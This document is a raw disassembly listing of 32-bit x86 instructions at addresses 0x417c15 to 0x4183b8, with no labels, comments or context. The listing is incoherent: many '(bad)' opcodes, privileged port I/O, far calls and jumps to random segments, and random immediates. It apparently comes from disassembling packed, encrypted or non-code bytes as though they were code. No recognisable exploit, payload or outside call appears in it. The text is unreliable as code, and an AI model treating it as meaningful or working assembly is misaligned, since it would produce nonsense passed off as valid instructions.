  417c15:	ds sbb ecx,DWORD PTR cs:[eax-0x35c7a642]
  417c1d:	(bad)  
  417c1e:	cld    
  417c1f:	pop    es
  417c20:	add    edx,esi
  417c22:	xchg   esi,eax
  417c23:	inc    eax
  417c24:	and    al,0xba
  417c26:	(bad)  
  417c27:	mov    bl,0xd1
  417c29:	mov    dl,0xf6
  417c2b:	mul    BYTE PTR [ebx+0x31]
  417c2e:	sbb    DWORD PTR [ebx+0x7f],0xf2a966dc
  417c35:	test   bh,bl
  417c37:	pop    esi
  417c38:	mov    ds:0x6bb08c83,al
  417c3d:	cmp    DWORD PTR [ecx-0x3aa7c94a],ebp
  417c43:	shr    BYTE PTR [edi+0x781004bb],1
  417c49:	cld    
  417c4a:	push   ecx
  417c4b:	nop
  417c4c:	mov    dl,0x6b
  417c4e:	retf   0xc62b
  417c51:	or     ah,dl
  417c53:	sub    eax,0x7bd6bf47
  417c58:	ins    BYTE PTR es:[edi],dx
  417c59:	test   dh,bh
  417c5b:	cmp    edi,0x9497500a
  417c61:	(bad)  
  417c62:	loopne 0x417cb2
  417c64:	adc    DWORD PTR [ecx+0x6],ebp
  417c67:	mov    bh,0x32
  417c69:	aas    
  417c6a:	(bad)  
  417c6b:	scas   eax,DWORD PTR es:[edi]
  417c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c6d:	push   ds
  417c6e:	ret    
  417c6f:	xchg   ebp,eax
  417c70:	inc    edi
  417c71:	mov    eax,ds:0xa6de0b94
  417c76:	sub    DWORD PTR [ebp+0x7eb21aee],esi
  417c7c:	lods   eax,DWORD PTR ds:[esi]
  417c7d:	push   es
  417c7e:	ds in  al,dx
  417c80:	arpl   cx,dx
  417c82:	loopne 0x417cdb
  417c84:	mov    cl,0x2c
  417c86:	add    ah,BYTE PTR [esi]
  417c88:	sbb    eax,0x93cc3c09
  417c8d:	inc    edx
  417c8e:	push   esp
  417c8f:	mov    al,0xfa
  417c91:	mov    ebp,DWORD PTR ds:0x29029896
  417c97:	xor    DWORD PTR [esi],ecx
  417c99:	adc    cl,dh
  417c9b:	push   ebp
  417c9c:	mov    eax,0x40d0b50b
  417ca1:	shl    BYTE PTR ds:0xbfd4c245,cl
  417ca7:	cld    
  417ca8:	int    0xce
  417caa:	cwde   
  417cab:	lahf   
  417cac:	sar    BYTE PTR [esi+0x7316b3ec],1
  417cb2:	xchg   esi,eax
  417cb3:	pop    edx
  417cb4:	add    BYTE PTR [esi-0x1358891a],ch
  417cba:	push   eax
  417cbb:	loopne 0x417c4b
  417cbd:	frstor [edi+eax*8-0x65876a6]
  417cc4:	pop    es
  417cc5:	add    dl,BYTE PTR [ecx+0x4e]
  417cc8:	jo     0x417d20
  417cca:	cwde   
  417ccb:	jo     0x417d3a
  417ccd:	je     0x417ce8
  417ccf:	fcomp  DWORD PTR es:[ecx]
  417cd2:	int    0x82
  417cd4:	mov    bl,0x22
  417cd6:	out    dx,al
  417cd7:	dec    ecx
  417cd8:	dec    edi
  417cd9:	lods   al,BYTE PTR ds:[esi]
  417cda:	(bad)  
  417cdb:	xor    eax,0x90142cb9
  417ce0:	and    DWORD PTR [edx+0x55],0xffffffb8
  417ce4:	mov    esi,DWORD PTR [ecx-0x1c]
  417ce7:	mov    esp,DWORD PTR [edi+0x76]
  417cea:	add    BYTE PTR [eax],0xc9
  417ced:	jle    0x417d3f
  417cef:	add    DWORD PTR [edx-0x7e4a7916],0xb51cf1a9
  417cf9:	xor    BYTE PTR [ebx+0x2f],ah
  417cfc:	jae    0x417d1f
  417cfe:	sub    ecx,DWORD PTR [esi]
  417d00:	pop    ss
  417d01:	shl    BYTE PTR [ecx+0x65],cl
  417d04:	jecxz  0x417d2a
  417d06:	xlat   BYTE PTR ds:[ebx]
  417d07:	sti    
  417d08:	(bad)  
  417d0a:	mov    ch,0x89
  417d0d:	mov    ah,0xce
  417d0f:	jge    0x417d62
  417d11:	mov    bh,0xd8
  417d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d14:	add    DWORD PTR [ecx],esp
  417d16:	aad    0xc2
  417d18:	dec    DWORD PTR [edx]
  417d1a:	or     cl,bh
  417d1c:	cmp    BYTE PTR [eax+0x68],ah
  417d1f:	jnp    0x417d97
  417d21:	and    bh,dh
  417d23:	pop    edx
  417d24:	stos   DWORD PTR es:[edi],eax
  417d25:	xor    al,0xd6
  417d27:	dec    edx
  417d28:	fnstcw WORD PTR [ebx+0x73]
  417d2b:	adc    esi,edi
  417d2d:	sahf   
  417d2e:	jge    0x417d76
  417d30:	inc    edx
  417d31:	ins    BYTE PTR es:[edi],dx
  417d32:	xor    eax,0x34268a64
  417d37:	test   ebx,ecx
  417d39:	clc    
  417d3a:	dec    edx
  417d3b:	xchg   DWORD PTR [esi+esi*4+0x5d1dd87a],eax
  417d42:	sahf   
  417d43:	cmp    eax,0xde7539b6
  417d48:	pop    ecx
  417d49:	popf   
  417d4a:	add    cl,cl
  417d4c:	push   es
  417d4d:	shl    BYTE PTR [ebx+0xe],0x36
  417d51:	arpl   WORD PTR [ebx+ebp*8],cx
  417d54:	lock cmp eax,0xc01424b0
  417d5a:	mov    ebp,0x6cf170c6
  417d5f:	scas   eax,DWORD PTR es:[edi]
  417d60:	pusha  
  417d61:	rcr    DWORD PTR [eax-0x324ba4bc],0xd7
  417d68:	int3   
  417d69:	pop    ds
  417d6a:	jo     0x417d56
  417d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d6d:	mov    esp,0xf47cb41f
  417d72:	(bad)  
  417d73:	sbb    esi,DWORD PTR [eax]
  417d75:	fimul  DWORD PTR [ecx-0x1]
  417d78:	ins    BYTE PTR es:[edi],dx
  417d79:	dec    edi
  417d7a:	retf   0x7719
  417d7d:	dec    esp
  417d7e:	bound  eax,QWORD PTR [edi]
  417d80:	push   ds
  417d81:	arpl   bx,di
  417d83:	je     0x417dfe
  417d85:	ret    
  417d86:	cmc    
  417d87:	std    
  417d88:	rcr    bl,1
  417d8a:	dec    eax
  417d8b:	inc    edx
  417d8c:	and    eax,0xcbc8f928
  417d91:	int    0xa9
  417d93:	fsub   st,st(2)
  417d95:	sub    ch,BYTE PTR [edx-0x7]
  417d98:	fisubr WORD PTR [esi]
  417d9a:	mov    edi,0x78ed8121
  417d9f:	ss adc al,0x82
  417da2:	xor    ebp,ecx
  417da4:	call   0xb4433243
  417da9:	dec    di
  417dab:	push   ebp
  417dac:	into   
  417dad:	js     0x417d5b
  417daf:	mov    al,ds:0x15bafab9
  417db4:	sbb    DWORD PTR [edi-0x62],0xa
  417db8:	cs inc ebp
  417dba:	xchg   ebx,eax
  417dbb:	push   0x3b70f8f6
  417dc0:	cli    
  417dc1:	jae    0x417dcc
  417dc3:	fcomi  st,st(2)
  417dc5:	mov    bl,0xf
  417dc7:	outs   dx,BYTE PTR ds:[esi]
  417dc8:	xchg   esi,eax
  417dc9:	sti    
  417dca:	inc    ecx
  417dcb:	pop    edx
  417dcc:	cmp    bh,al
  417dce:	push   0xfffffffe
  417dd0:	or     dl,BYTE PTR [edi+eiz*8]
  417dd3:	xor    edx,DWORD PTR [edx-0x21]
  417dd6:	sbb    ebx,DWORD PTR [ecx]
  417dd8:	sbb    dh,BYTE PTR [bp+di-0x5d70]
  417ddd:	cmc    
  417dde:	mov    al,0x2d
  417de0:	push   0x36c27ef
  417de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417de6:	repnz in al,0xf3
  417de9:	xchg   edi,eax
  417dea:	shl    BYTE PTR [esi],1
  417dec:	je     0x417e01
  417dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417def:	add    BYTE PTR [ecx+0x48],cl
  417df2:	mov    dl,0xc3
  417df4:	inc    esi
  417df5:	sub    al,0x16
  417df7:	aam    0x3
  417df9:	pusha  
  417dfa:	mov    ebp,0x4800d838
  417dff:	sar    dh,0x37
  417e02:	add    al,0xc2
  417e04:	xchg   esi,eax
  417e05:	sub    BYTE PTR [edx],al
  417e07:	(bad)  
  417e08:	cmp    eax,0xc8dfa183
  417e0d:	sub    DWORD PTR [ebp-0xb],ebp
  417e10:	xchg   ebx,eax
  417e11:	loop   0x417e7c
  417e13:	pop    esi
  417e14:	cmp    al,0x7e
  417e16:	shr    DWORD PTR [ebx+eiz*2-0x45],1
  417e1a:	adc    bl,BYTE PTR [ecx-0x2c]
  417e1d:	loopne 0x417e64
  417e1f:	mov    ah,0x3f
  417e21:	fcomi  st,st(7)
  417e23:	cdq    
  417e24:	in     al,dx
  417e25:	pop    ecx
  417e26:	push   ebp
  417e27:	or     eax,0xdcf9f6fa
  417e2c:	pop    ebx
  417e2d:	add    dh,BYTE PTR [eax]
  417e2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e30:	xor    dl,BYTE PTR [ebx-0xfabb59c]
  417e36:	pop    ss
  417e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e38:	and    cl,bh
  417e3a:	or     dl,BYTE PTR [edi-0x32a3854e]
  417e40:	xchg   esi,ebp
  417e42:	or     eax,0x1905d2f3
  417e47:	cmp    eax,0x5e4ed440
  417e4c:	and    al,0x47
  417e4e:	mov    esp,0x9cd331ce
  417e53:	test   DWORD PTR [ecx],esp
  417e55:	mov    dl,0xe0
  417e57:	sbb    ch,0xd3
  417e5a:	ss jmp 0x4cfff62f
  417e60:	pop    eax
  417e61:	cld    
  417e62:	sahf   
  417e63:	call   FWORD PTR [ebx]
  417e65:	mov    esi,0x5c8bb001
  417e6a:	data16 in al,0xb4
  417e6d:	sub    BYTE PTR [esi+0x284e6b67],dl
  417e73:	pop    eax
  417e74:	int    0xe4
  417e76:	sub    ah,dl
  417e78:	pop    ss
  417e79:	(bad)  
  417e7a:	arpl   WORD PTR [ecx],dx
  417e7c:	or     esi,DWORD PTR [ebx]
  417e7e:	inc    ebx
  417e7f:	out    0xe4,al
  417e81:	es arpl bp,di
  417e84:	cmp    DWORD PTR [ecx+ebx*2+0x53a5c79b],ebp
  417e8b:	into   
  417e8c:	jbe    0x417ef4
  417e8e:	into   
  417e8f:	rcl    BYTE PTR [ebx],1
  417e91:	sbb    cl,BYTE PTR [ebp-0x7b]
  417e94:	adc    eax,0x5add1a4b
  417e99:	xchg   edx,eax
  417e9a:	mov    ds:0x640caa29,eax
  417e9f:	inc    ebp
  417ea0:	or     al,0x3e
  417ea2:	adc    DWORD PTR [ecx],0xffffffef
  417ea5:	icebp  
  417ea6:	sbb    al,0x4d
  417ea8:	jnp    0x417e8d
  417eaa:	ror    dh,0x22
  417ead:	pop    edi
  417eae:	mov    edi,0xdfaea422
  417eb3:	scas   al,BYTE PTR es:[edi]
  417eb4:	cli    
  417eb5:	nop
  417eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eb7:	(bad)  
  417eb8:	clc    
  417eb9:	xchg   ebp,eax
  417eba:	leave  
  417ebb:	mov    ebx,0x328c62d7
  417ec0:	fsub   DWORD PTR [ecx]
  417ec2:	sub    al,0x2c
  417ec4:	test   DWORD PTR [ecx],ebx
  417ec6:	mov    bl,0x4c
  417ec8:	pop    ecx
  417ec9:	mov    ds:0x5bf1b86d,eax
  417ece:	push   edx
  417ecf:	xchg   BYTE PTR [esi],dl
  417ed1:	mov    ebp,0x37905c0f
  417ed6:	das    
  417ed7:	sub    BYTE PTR [ecx-0x2e],ch
  417eda:	gs mov ecx,0x806c9869
  417ee0:	(bad)
  417ee3:	popa   
  417ee4:	nop
  417ee5:	cmp    al,0x35
  417ee7:	push   edx
  417ee8:	icebp  
  417ee9:	gs in  al,0xa7
  417eec:	pop    esi
  417eed:	and    al,0x2f
  417eef:	fistp  QWORD PTR [ebx]
  417ef1:	xor    eax,0xf8668f91
  417ef6:	loop   0x417ef9
  417ef8:	outs   dx,BYTE PTR ds:[esi]
  417ef9:	pop    es
  417efa:	cmp    cl,BYTE PTR [ebx]
  417efc:	sbb    eax,0x90d60d2
  417f01:	push   ebp
  417f02:	sbb    DWORD PTR [edi+ebp*4-0x25772f6b],ebp
  417f09:	pop    eax
  417f0a:	xor    eax,0x949c93a5
  417f0f:	push   ds
  417f10:	iret   
  417f11:	aad    0x94
  417f13:	sub    BYTE PTR [eax+0x7663b21c],dl
  417f19:	in     al,dx
  417f1a:	sbb    edi,DWORD PTR [eax+0x1b69572f]
  417f20:	mov    ds:0x5d51b32,al
  417f25:	lea    esi,[esi+0x75813192]
  417f2b:	cdq    
  417f2c:	dec    ecx
  417f2d:	inc    eax
  417f2e:	xor    edi,DWORD PTR [edi-0x78]
  417f31:	div    BYTE PTR [esi-0x7]
  417f34:	jmp    0x417f15
  417f36:	pop    esp
  417f37:	js     0x417f26
  417f39:	stos   DWORD PTR es:[edi],eax
  417f3a:	sbb    bh,BYTE PTR [ebp+0x311a295c]
  417f40:	push   0xc3d88705
  417f45:	jne    0x417f27
  417f47:	dec    esi
  417f48:	xor    BYTE PTR [ecx+0x2a],0xc6
  417f4c:	mov    eax,0x16a9c9bd
  417f51:	out    0xfb,eax
  417f53:	cs xor eax,0x7f79a5f5
  417f59:	xor    DWORD PTR [ebx+edx*8],esp
  417f5c:	push   ebx
  417f5d:	adc    al,0xf3
  417f5f:	mov    esi,0xda08d69c
  417f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f65:	pop    ecx
  417f66:	xchg   edi,eax
  417f67:	ins    BYTE PTR es:[edi],dx
  417f68:	mov    bl,0x94
  417f6a:	and    BYTE PTR [edx+0x2b],cl
  417f6d:	jns    0x417f43
  417f6f:	sbb    ebp,edi
  417f71:	xor    bl,BYTE PTR [edi]
  417f73:	sub    eax,0x67b1828
  417f78:	and    eax,0x131e51e9
  417f7d:	call   0x46c4:0x5c8dcec7
  417f84:	sbb    BYTE PTR [eax],dh
  417f86:	cmp    eax,0x71e2f1f4
  417f8b:	xchg   esp,eax
  417f8c:	mov    dl,0xf5
  417f8e:	out    0xfc,eax
  417f90:	mov    ds:0x73b535c4,al
  417f95:	mov    dh,0x97
  417f97:	sub    eax,0x560491b4
  417f9c:	xlat   BYTE PTR ds:[ebx]
  417f9d:	mov    BYTE PTR [esi-0x6baa8a49],dh
  417fa3:	in     eax,dx
  417fa4:	js     0x417f4f
  417fa6:	mov    ss,WORD PTR [edx]
  417fa8:	test   eax,0x4ca3de7b
  417fad:	jae    0x417fc3
  417faf:	and    ebx,DWORD PTR [edx]
  417fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fb2:	(bad)  
  417fb4:	aas    
  417fb5:	cld    
  417fb6:	(bad)  
  417fb7:	jmp    0x417fad
  417fb9:	retf   0x943
  417fbc:	loope  0x417f60
  417fbe:	shr    DWORD PTR [ebp+0x7b91d42a],0x92
  417fc5:	sub    bl,BYTE PTR [esi-0x51]
  417fc8:	push   eax
  417fc9:	xchg   edx,eax
  417fca:	push   esp
  417fcb:	dec    BYTE PTR [ebp-0x79]
  417fce:	cmc    
  417fcf:	fimul  DWORD PTR [eax]
  417fd1:	cmp    BYTE PTR [esi],bl
  417fd3:	cdq    
  417fd4:	jp     0x41801f
  417fd6:	call   FWORD PTR [esi-0x369755d5]
  417fdc:	pop    edx
  417fdd:	pop    ss
  417fde:	fst    DWORD PTR [edx]
  417fe0:	sbb    al,0xc8
  417fe2:	mov    ah,0x58
  417fe4:	mov    ebx,0xba8fb571
  417fe9:	fwait
  417fea:	ret    0x8b57
  417fed:	fiadd  DWORD PTR [ecx-0x41]
  417ff0:	mov    al,ds:0x38b27dbc
  417ff5:	clc    
  417ff6:	scas   eax,DWORD PTR es:[edi]
  417ff7:	call   0x3f84:0xccb09136
  417ffe:	loope  0x417fd8
  418000:	stos   DWORD PTR es:[edi],eax
  418001:	add    BYTE PTR [ebx+0x1],0x31
  418005:	adc    DWORD PTR [esi+0x189287de],0xffffff8e
  41800c:	mov    al,ds:0xa3315b8b
  418011:	fcomp  DWORD PTR [ebx+0x1a]
  418014:	pop    ebp
  418015:	inc    ebp
  418016:	repz pushf 
  418018:	cmp    cl,ch
  41801a:	mov    edx,0x8afeaf40
  41801f:	push   ss
  418020:	out    dx,al
  418021:	out    0x45,eax
  418023:	retf   0xe23f
  418026:	(bad)  
  418027:	(bad)  
  418028:	jle    0x418020
  41802a:	adc    DWORD PTR [eax+0x4365ba43],0xd9fba74e
  418034:	adc    DWORD PTR [ebp+0x368c0421],edi
  41803a:	jmp    0xeee7:0xc6a76270
  418041:	cs jno 0x418092
  418044:	fbld   TBYTE PTR [ebx+0x2b]
  418047:	jbe    0x418078
  418049:	pop    eax
  41804a:	mov    BYTE PTR [edx-0x4c778b1],bl
  418050:	mov    ds:0xf8603060,eax
  418055:	dec    edi
  418056:	aas    
  418057:	jns    0x4180b2
  418059:	push   esp
  41805a:	add    eax,0x956b7b5c
  41805f:	push   cs
  418060:	mov    ebx,0xb0a08acb
  418065:	fistp  QWORD PTR [ecx]
  418067:	neg    DWORD PTR [ecx+0x76]
  41806a:	inc    esi
  41806b:	xchg   edx,eax
  41806c:	imul   eax,DWORD PTR [edi],0x3b
  41806f:	jp     0x4180b9
  418071:	bnd ds jg 0x4180c5
  418075:	aas    
  418076:	push   eax
  418077:	or     eax,0x506f05ac
  41807c:	mov    bh,0xa2
  41807e:	jmp    0x74c5f4c5
  418083:	hlt    
  418084:	fcom   DWORD PTR [eax]
  418086:	ret    
  418087:	test   BYTE PTR [ebx],cl
  418089:	jne    0x4180a1
  41808b:	and    eax,0xc9d41957
  418090:	rcr    BYTE PTR [ebx-0xe6655a7],cl
  418096:	dec    edx
  418097:	sub    edx,0x75286da5
  41809d:	or     al,0x0
  41809f:	dec    edx
  4180a0:	ror    DWORD PTR [esi],1
  4180a2:	dec    DWORD PTR [edx+0x60088810]
  4180a8:	sub    al,0xb8
  4180aa:	pop    esp
  4180ab:	ret    
  4180ac:	lods   eax,DWORD PTR ds:[esi]
  4180ad:	sti    
  4180ae:	data16 stc 
  4180b0:	mov    ebx,0x7142654e
  4180b5:	mov    ch,0xd8
  4180b7:	inc    eax
  4180b8:	xor    BYTE PTR [esi+0x63],bh
  4180bb:	out    dx,eax
  4180bc:	dec    ebp
  4180bd:	scas   al,BYTE PTR es:[edi]
  4180be:	scas   eax,DWORD PTR es:[edi]
  4180bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180c0:	mov    ebx,0xffcbfa5
  4180c5:	scas   al,BYTE PTR es:[edi]
  4180c6:	pop    edx
  4180c7:	pop    ecx
  4180c8:	loop   0x418068
  4180ca:	mov    ds:0x1e96292e,eax
  4180cf:	mov    dh,bh
  4180d1:	enter  0x9cd2,0x5a
  4180d5:	das    
  4180d6:	cld    
  4180d7:	add    al,0x8d
  4180d9:	fmul   DWORD PTR [ebp-0xa8ffbca]
  4180e0:	int    0x38
  4180e2:	(bad)  
  4180e4:	inc    ebp
  4180e5:	pop    edx
  4180e6:	push   DWORD PTR [eax]
  4180e8:	sub    BYTE PTR [eax-0x32f1c744],cl
  4180ee:	in     al,dx
  4180ef:	sbb    eax,0xa539603a
  4180f4:	mov    ah,0x1
  4180f6:	and    bl,0xae
  4180f9:	cs mov cl,0xb7
  4180fc:	mov    dl,0x1f
  4180fe:	cmc    
  4180ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418100:	mov    edi,0xd0b744f0
  418105:	fistp  QWORD PTR [eax+0x32]
  418108:	(bad)  
  418109:	idiv   esi
  41810b:	inc    esi
  41810c:	and    eax,0xaf037a18
  418111:	add    edi,DWORD PTR [edx-0x2c]
  418114:	push   0xffffff94
  418116:	xchg   DWORD PTR [edx+0x35],eax
  418119:	jmp    0xd761143
  41811e:	or     esp,esp
  418120:	jnp    0x418175
  418122:	arpl   ax,bx
  418124:	xchg   ecx,eax
  418125:	(bad)  
  418126:	dec    edi
  418127:	rcr    ebp,cl
  418129:	test   al,0x3e
  41812b:	and    ch,BYTE PTR [ecx-0x37234e05]
  418131:	mov    DWORD PTR [ebx],ebp
  418133:	push   ds
  418134:	out    0x7a,al
  418136:	adc    DWORD PTR [eax+eiz*8],esp
  418139:	dec    ebp
  41813a:	sub    DWORD PTR [eax-0x42],eax
  41813d:	add    BYTE PTR [edi],dh
  41813f:	mov    dl,0x1f
  418141:	dec    edi
  418142:	aaa    
  418143:	push   ebp
  418145:	sub    al,0x99
  418147:	nop
  418148:	sbb    al,0xb6
  41814a:	pop    ds
  41814b:	jo     0x418138
  41814d:	nop
  41814e:	pop    ecx
  41814f:	(bad)  
  418150:	mov    ah,0x6b
  418152:	pop    ebx
  418153:	(bad)  
  418154:	mov    ebp,DWORD PTR [esp+edx*1]
  418157:	fmul   QWORD PTR [ecx-0x3a]
  41815a:	pop    es
  41815b:	pop    esi
  41815c:	popf   
  41815d:	dec    ebp
  41815e:	lahf   
  41815f:	in     al,dx
  418160:	sub    eax,ebp
  418162:	sub    DWORD PTR [edx],edx
  418164:	mov    eax,ds:0xa8b745e
  418169:	and    DWORD PTR [eax],ecx
  41816b:	(bad)  
  41816c:	std    
  41816d:	imul   esi
  41816f:	mov    ch,dh
  418171:	xor    eax,0xeee4d06f
  418176:	ret    
  418177:	dec    ecx
  418178:	sub    edi,DWORD PTR [edi+0x3dc7a0cf]
  41817e:	inc    ebx
  41817f:	push   DWORD PTR [ebp+0x382a0a8c]
  418185:	stos   DWORD PTR es:[edi],eax
  418186:	push   ecx
  418187:	dec    esp
  418188:	sub    edx,ecx
  41818a:	mov    dl,0xcb
  41818c:	aam    0xb4
  41818e:	icebp  
  41818f:	fiadd  DWORD PTR [ecx+0x1971c3d5]
  418195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418196:	and    edi,ebp
  418198:	aam    0xfe
  41819a:	push   eax
  41819b:	mov    eax,ds:0xab344feb
  4181a0:	fimul  WORD PTR [esp+ebp*4-0x25]
  4181a4:	dec    esp
  4181a5:	adc    al,ah
  4181a7:	leave  
  4181a8:	push   ds
  4181a9:	xchg   esi,eax
  4181aa:	test   DWORD PTR [ebx],eax
  4181ac:	mov    ecx,0x14a95ba0
  4181b1:	fs jne 0x41818e
  4181b4:	loope  0x418183
  4181b6:	cmp    eax,0x75fa73e3
  4181bb:	dec    BYTE PTR [eax]
  4181bd:	js     0x41814e
  4181bf:	gs mov ah,0x54
  4181c2:	pop    es
  4181c3:	push   ecx
  4181c4:	sbb    BYTE PTR [ebp+0x2d],0x77
  4181c8:	pop    ebx
  4181c9:	in     al,0xbd
  4181cb:	jp     0x418206
  4181cd:	int3   
  4181ce:	js     0x4181e9
  4181d0:	jbe    0x41823b
  4181d2:	lods   eax,DWORD PTR ss:[esi]
  4181d4:	fcmove st,st(6)
  4181d6:	and    al,BYTE PTR [ebx+0x12a0e2b2]
  4181dc:	jge    0x4181c5
  4181de:	xchg   ebx,eax
  4181df:	xor    al,0x1
  4181e1:	retf   0x114b
  4181e4:	and    DWORD PTR [edx-0x5d],edx
  4181e7:	bswap  edx
  4181e9:	jp     0x418177
  4181eb:	jae    0x41818e
  4181ed:	in     eax,0xcc
  4181ef:	add    eax,0xd1ce93c0
  4181f4:	rcl    ah,cl
  4181f6:	test   ch,bh
  4181f8:	in     al,0x25
  4181fa:	cmp    al,0xea
  4181fc:	mov    ecx,0xb624dd95
  418201:	in     al,dx
  418202:	push   esp
  418203:	retf   
  418204:	add    DWORD PTR [edi-0x36f62811],edi
  41820a:	sbb    DWORD PTR [edi+0x773bc906],esp
  418210:	daa    
  418211:	push   edx
  418212:	repz adc BYTE PTR [eax-0x61],0xbb
  418217:	xlat   BYTE PTR ds:[ebx]
  418218:	xchg   DWORD PTR [esi-0x48],edi
  41821b:	lea    ebp,[esi-0x2de84b34]
  418221:	aas    
  418222:	popa   
  418223:	fdivrp st(6),st
  418225:	jno    0x418280
  418227:	push   edi
  418228:	(bad)
  41822b:	stos   BYTE PTR es:[edi],al
  41822c:	lea    edi,[edx+0x22dace44]
  418232:	jnp    0x418242
  418234:	aam    0x9c
  418236:	jl     0x4181d6
  418238:	push   ebx
  418239:	xor    al,BYTE PTR [eax-0x69]
  41823c:	xor    BYTE PTR [ebx+0x4f0341d6],al
  418242:	pop    ebp
  418243:	aad    0x43
  418245:	test   eax,0xd741ab54
  41824a:	jo     0x4182cb
  41824c:	outs   dx,DWORD PTR ds:[esi]
  41824d:	(bad)  
  41824e:	shl    BYTE PTR [ebx-0x7adc126],1
  418254:	xchg   ecx,eax
  418255:	mov    al,ds:0x36813ee5
  41825a:	jecxz  0x4182b0
  41825c:	arpl   WORD PTR [edx+0xd860d53],dx
  418262:	cmp    al,0xfe
  418264:	test   eax,0x52c6ece8
  418269:	sahf   
  41826a:	cdq    
  41826b:	dec    esi
  41826c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41826d:	je     0x418252
  41826f:	xlat   BYTE PTR ds:[ebx]
  418270:	test   DWORD PTR [ebp+0x60],ecx
  418273:	mov    edx,0xd609ed38
  418278:	cli    
  418279:	jle    0x4182e4
  41827b:	or     BYTE PTR [ebx+0x20f4bff],dh
  418281:	pop    esp
  418282:	sub    al,0xe3
  418284:	repz jno 0x418281
  418287:	mov    ebx,0xc9a9c24b
  41828c:	mov    WORD PTR [edx],ss
  41828e:	fsubrp st(0),st
  418290:	adc    eax,0x7d6b7f4a
  418295:	aam    0xed
  418297:	iret   
  418298:	inc    eax
  418299:	mov    ds:0xfa09a82b,al
  41829e:	das    
  41829f:	test   DWORD PTR [edi-0x4729504b],esi
  4182a5:	pop    ss
  4182a6:	dec    edx
  4182a7:	inc    ecx
  4182a8:	push   es
  4182a9:	repz test ah,bl
  4182ac:	scas   eax,DWORD PTR es:[edi]
  4182ad:	jmp    0x418328
  4182af:	retf   
  4182b0:	das    
  4182b1:	mov    ebp,0x8b5e585
  4182b6:	sbb    BYTE PTR [ebx-0x5f],ah
  4182b9:	mov    edi,esi
  4182bb:	fucomi st,st(7)
  4182bd:	js     0x418329
  4182bf:	jmp    0x418242
  4182c1:	out    dx,eax
  4182c2:	or     al,0x28
  4182c4:	sti    
  4182c5:	pop    esp
  4182c6:	xchg   edi,eax
  4182c7:	lock jmp 0xc847:0x3136e762
  4182cf:	pusha  
  4182d0:	addr16 int 0x63
  4182d3:	cmp    BYTE PTR [ebp-0x5c],0x50
  4182d7:	sbb    eax,0xc8bcd523
  4182dc:	mov    eax,0xbc48c97
  4182e1:	nop
  4182e2:	cs fdiv st,st(6)
  4182e5:	test   eax,0x61017ad3
  4182ea:	enter  0x9f7d,0x82
  4182ee:	(bad)  
  4182ef:	pop    ss
  4182f0:	lds    edx,FWORD PTR [eax]
  4182f2:	aas    
  4182f3:	inc    edx
  4182f4:	cwde   
  4182f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182f6:	shr    BYTE PTR [edx],cl
  4182f8:	gs push esi
  4182fa:	pop    eax
  4182fb:	dec    eax
  4182fc:	mov    ebx,0x700b116b
  418301:	(bad)  
  418302:	retf   
  418303:	or     ebp,edx
  418305:	dec    esi
  418306:	adc    BYTE PTR [ecx-0x68],dh
  418309:	aaa    
  41830a:	or     edi,ebp
  41830c:	imul   eax,edi,0xffffffe5
  41830f:	scas   eax,DWORD PTR es:[edi]
  418310:	mov    bl,0xdf
  418312:	gs dec esp
  418314:	call   0xcfaa56c3
  418319:	push   cs
  41831a:	adc    al,ah
  41831c:	loope  0x418334
  41831e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41831f:	xchg   ecx,eax
  418320:	push   ds
  418321:	and    eax,0x98933ba2
  418326:	fsubr  QWORD PTR [ecx-0x21c0a1d2]
  41832c:	push   ss
  41832d:	sbb    DWORD PTR [esi-0x30],edx
  418330:	adc    DWORD PTR [esi+0x3b],0xd4ba71fc
  418337:	xchg   ebp,eax
  418338:	mov    ds:0x844835af,al
  41833d:	das    
  41833e:	(bad)  
  41833f:	pop    es
  418340:	inc    esp
  418341:	out    0x47,al
  418343:	test   dh,0x51
  418346:	sbb    DWORD PTR [edi],edx
  418348:	stos   DWORD PTR es:[edi],eax
  418349:	xor    eax,0x20277d4a
  41834e:	iret   
  41834f:	(bad)
  418352:	leave  
  418353:	dec    edi
  418354:	fst    QWORD PTR [ecx+eax*1-0x3ab585c7]
  41835b:	cmp    DWORD PTR [esp+ebp*4-0x33edc814],eax
  418362:	sub    ebx,DWORD PTR [ebx-0x6f]
  418365:	sti    
  418366:	and    eax,0xb91cb1b6
  41836b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41836c:	dec    ecx
  41836d:	cmp    ecx,DWORD PTR [edx+0x3087480d]
  418373:	popa   
  418374:	out    0x9f,al
  418376:	sub    al,0xb8
  418378:	push   es
  418379:	dec    eax
  41837a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41837b:	sbb    bl,dh
  41837d:	fist   DWORD PTR [esi+0xc]
  418380:	outs   dx,BYTE PTR ds:[esi]
  418381:	mov    cl,0x1a
  418383:	or     al,0xeb
  418385:	dec    eax
  418386:	(bad)  
  418387:	jb     0x41835a
  418389:	jb     0x418333
  41838b:	xchg   DWORD PTR [ebp-0x785433ff],edi
  418391:	adc    BYTE PTR [ebp+0xadf0da6],bh
  418397:	push   es
  418398:	mov    WORD PTR [edx-0x4aecaf71],ss
  41839e:	pusha  
  41839f:	jle    0x4183ce
  4183a1:	sbb    DWORD PTR [ecx+eiz*1+0x5b5dd35f],edx
  4183a8:	cdq    
  4183a9:	pop    edx
  4183aa:	leave  
  4183ab:	lods   eax,DWORD PTR ds:[esi]
  4183ac:	cwde   
  4183ad:	cmp    esp,DWORD PTR ds:0xae12ed83
  4183b3:	xor    eax,0x1c8493c4
  4183b8:	fwait
